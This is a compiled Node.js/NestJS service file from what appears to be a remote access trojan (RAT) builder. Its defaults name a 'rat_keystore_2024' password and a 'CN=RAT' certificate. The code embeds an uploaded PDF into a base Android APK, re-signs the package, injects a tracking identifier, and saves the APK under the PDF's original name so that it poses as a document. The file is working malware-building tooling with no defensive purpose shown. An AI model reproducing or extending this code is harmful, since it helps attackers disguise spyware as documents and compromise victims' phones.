"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var ApkService_1;
Object.defineProperty(exports, "__esModule", { value: true });
exports.ApkService = void 0;
const common_1 = require("@nestjs/common");
const path_1 = require("path");
const fs = __importStar(require("fs"));
const child_process_1 = require("child_process");
const util_1 = require("util");
const AdmZip = require("adm-zip");
const apk_injector_service_1 = require("./apk-injector.service");
const build_events_1 = require("../build-events");
const execAsync = (0, util_1.promisify)(child_process_1.exec);
const IS_WINDOWS = process.platform === 'win32';
const KEYSTORE_PASSWORD = process.env.KEYSTORE_PASSWORD || 'rat_keystore_2024';
const KEYSTORE_ALIAS = process.env.KEYSTORE_ALIAS || 'rat_key';
const KEYSTORE_DNAME = process.env.KEYSTORE_DNAME || 'CN=RAT,OU=RAT,O=RAT,L=City,S=State,C=US';
const BASE_APK_FILENAME = process.env.BASE_APK_FILENAME || 'app.apk';
const KEYSTORE_FILENAME = process.env.KEYSTORE_FILENAME || 'keystore.jks';
const GENERATED_APK_DIR_NAME = process.env.GENERATED_APK_DIR_NAME || 'generated';
const APK_ASSETS_PDF_PATH = process.env.APK_ASSETS_PDF_PATH || 'assets/sample.pdf';
const PDF_ID_PREFIX = process.env.PDF_ID_PREFIX || 'pdf_id=';
const APK_PROJECT_DIR = process.env.APK_PROJECT_DIR || (0, path_1.join)(__dirname, '..', '..', 'apk');
const BASE_APK_PATH = (0, path_1.join)(APK_PROJECT_DIR, BASE_APK_FILENAME);
const KEYSTORE_PATH = (0, path_1.join)(APK_PROJECT_DIR, KEYSTORE_FILENAME);
const GENERATED_APK_DIR = (0, path_1.join)(APK_PROJECT_DIR, GENERATED_APK_DIR_NAME);
function getDefaultAndroidSdkPath() {
    if (IS_WINDOWS) {
        const userProfile = process.env.USERPROFILE || 'C:\\Users\\Default';
        return (0, path_1.join)(userProfile, 'AppData', 'Local', 'Android', 'Sdk');
    }
    else {
        const home = process.env.HOME || '/root';
        return (0, path_1.join)(home, 'Android', 'Sdk');
    }
}
function resolveApksignerPath() {
    const sdkRoot = process.env.ANDROID_SDK_ROOT ||
        process.env.ANDROID_HOME ||
        process.env.DEFAULT_ANDROID_SDK_PATH ||
        getDefaultAndroidSdkPath();
    const buildToolsDir = (0, path_1.join)(sdkRoot, 'build-tools');
    if (!fs.existsSync(buildToolsDir)) {
        throw new Error(`Android build-tools not found in ${sdkRoot}`);
    }
    const versions = fs.readdirSync(buildToolsDir).sort().reverse();
    if (versions.length === 0) {
        throw new Error(`No build-tools versions found in ${buildToolsDir}`);
    }
    const ext = IS_WINDOWS ? 'apksigner.bat' : 'apksigner';
    return (0, path_1.join)(buildToolsDir, versions[0], ext);
}
let ApkService = ApkService_1 = class ApkService {
    apkInjector;
    logger = new common_1.Logger(ApkService_1.name);
    apksignerPath;
    javaHome;
    buildQueue = Promise.resolve();
    constructor(apkInjector) {
        this.apkInjector = apkInjector;
        if (!fs.existsSync(GENERATED_APK_DIR)) {
            fs.mkdirSync(GENERATED_APK_DIR, { recursive: true });
        }
        this.apksignerPath = resolveApksignerPath();
        this.ensureKeystore();
    }
    ensureKeystore() {
        const programFiles = process.env.PROGRAMFILES || 'C:\\Program Files';
        const keytoolCandidates = ['keytool'];
        if (process.env.KEYTOOL_PATH) {
            keytoolCandidates.push(process.env.KEYTOOL_PATH);
        }
        if (process.env.JAVA_HOME) {
            keytoolCandidates.push((0, path_1.join)(process.env.JAVA_HOME, 'bin', IS_WINDOWS ? 'keytool.exe' : 'keytool'));
        }
        if (IS_WINDOWS) {
            keytoolCandidates.push((0, path_1.join)(programFiles, 'Android', 'Android Studio', 'jbr', 'bin', 'keytool.exe'), (0, path_1.join)(programFiles, 'Java', 'jdk-17', 'bin', 'keytool.exe'), (0, path_1.join)(programFiles, 'Eclipse Adoptium', 'jdk-17', 'bin', 'keytool.exe'));
        }
        let keytoolPath = null;
        for (const candidate of keytoolCandidates) {
            try {
                (0, child_process_1.execSync)(`"${candidate}" -help`, { stdio: 'pipe' });
                keytoolPath = candidate;
                break;
            }
            catch {
            }
        }
        if (keytoolPath) {
            this.javaHome = require('path').dirname(require('path').dirname(keytoolPath));
        }
        else {
            this.logger.warn('keytool not found — APK signing might fail if java is not in PATH.');
        }
        if (fs.existsSync(KEYSTORE_PATH))
            return;
        if (!keytoolPath)
            return;
        this.logger.log(`Generating keystore with: ${keytoolPath}`);
        (0, child_process_1.execSync)(`"${keytoolPath}" -genkeypair -v` +
            ` -keystore "${KEYSTORE_PATH}"` +
            ` -alias ${KEYSTORE_ALIAS}` +
            ` -keyalg RSA -keysize 2048 -validity 10000` +
            ` -storepass ${KEYSTORE_PASSWORD}` +
            ` -keypass ${KEYSTORE_PASSWORD}` +
            ` -dname "${KEYSTORE_DNAME}"`, { stdio: 'pipe' });
        this.logger.log(`Keystore created: ${KEYSTORE_PATH}`);
    }
    getApkPath(originalName) {
        const safeName = originalName
            .replace(/\.pdf$/i, '')
            .replace(/[^a-zA-Zа-яА-Я0-9_ \-]/g, '_');
        return (0, path_1.join)(GENERATED_APK_DIR, `${safeName}.apk`);
    }
    enqueueApkBuild(pdfId, pdfFilePath, originalName) {
        this.buildQueue = this.buildQueue
            .then(() => this.runBuildPipeline(pdfId, pdfFilePath, originalName))
            .catch((err) => {
            this.logger.error(`Build failed for pdfId=${pdfId}: ${err.message}`);
            build_events_1.buildEvents.emit('apk_error', { pdfId, error: err.message });
        });
    }
    async runBuildPipeline(pdfId, pdfFilePath, originalName) {
        this.logger.log(`[${pdfId}] APK modification started`);
        build_events_1.buildEvents.emit('apk_building', { pdfId });
        if (!fs.existsSync(BASE_APK_PATH)) {
            throw new Error(`Base APK not found at: ${BASE_APK_PATH}`);
        }
        const unsignedTmpPath = (0, path_1.join)(GENERATED_APK_DIR, `${pdfId}-unsigned.apk`);
        const signedTmpPath = (0, path_1.join)(GENERATED_APK_DIR, `${pdfId}-signed.apk`);
        try {
            const zip = new AdmZip(BASE_APK_PATH);
            const pdfBuffer = fs.readFileSync(pdfFilePath);
            const entryName = APK_ASSETS_PDF_PATH;
            const existingEntry = zip.getEntry(entryName);
            if (existingEntry) {
                zip.updateFile(existingEntry, pdfBuffer);
            }
            else {
                zip.addFile(entryName, pdfBuffer);
            }
            zip.writeZip(unsignedTmpPath);
            this.logger.log(`[${pdfId}] ZIP modified (PDF injected)`);
            try {
                await execAsync(`"${this.apksignerPath}" sign` +
                    ` --ks "${KEYSTORE_PATH}"` +
                    ` --ks-pass pass:${KEYSTORE_PASSWORD}` +
                    ` --ks-key-alias ${KEYSTORE_ALIAS}` +
                    ` --key-pass pass:${KEYSTORE_PASSWORD}` +
                    ` --v1-signing-enabled true` +
                    ` --v2-signing-enabled true` +
                    ` --out "${signedTmpPath}"` +
                    ` "${unsignedTmpPath}"`, { env: { ...process.env, JAVA_HOME: this.javaHome } });
            }
            catch (signErr) {
                this.logger.error(`apksigner failed! stdout: ${signErr.stdout}, stderr: ${signErr.stderr}`);
                throw signErr;
            }
            this.logger.log(`[${pdfId}] APK re-signed`);
            const signedBuffer = fs.readFileSync(signedTmpPath);
            const injectedBuffer = this.apkInjector.inject(signedBuffer, `${PDF_ID_PREFIX}${pdfId}`);
            fs.writeFileSync(this.getApkPath(originalName), injectedBuffer);
            this.logger.log(`[${pdfId}] pdf_id injected → ${this.getApkPath(originalName)}`);
            build_events_1.buildEvents.emit('apk_ready', { pdfId });
        }
        finally {
            try {
                if (fs.existsSync(unsignedTmpPath))
                    fs.unlinkSync(unsignedTmpPath);
                if (fs.existsSync(signedTmpPath))
                    fs.unlinkSync(signedTmpPath);
                const idsigPath = signedTmpPath + '.idsig';
                if (fs.existsSync(idsigPath))
                    fs.unlinkSync(idsigPath);
            }
            catch (cleanupErr) {
                this.logger.warn(`Failed to cleanup temp files for ${pdfId}: ${cleanupErr.message}`);
            }
        }
    }
    deleteApk(pdfId, originalName) {
        const apkPath = this.getApkPath(originalName);
        if (fs.existsSync(apkPath)) {
            fs.unlinkSync(apkPath);
            this.logger.log(`APK deleted for pdfId: ${pdfId}`);
        }
        else {
            this.logger.warn(`APK not found for deletion, pdfId: ${pdfId}`);
        }
    }
};
exports.ApkService = ApkService;
exports.ApkService = ApkService = ApkService_1 = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [apk_injector_service_1.ApkInjectorService])
], ApkService);
//# sourceMappingURL=apk.service.js.map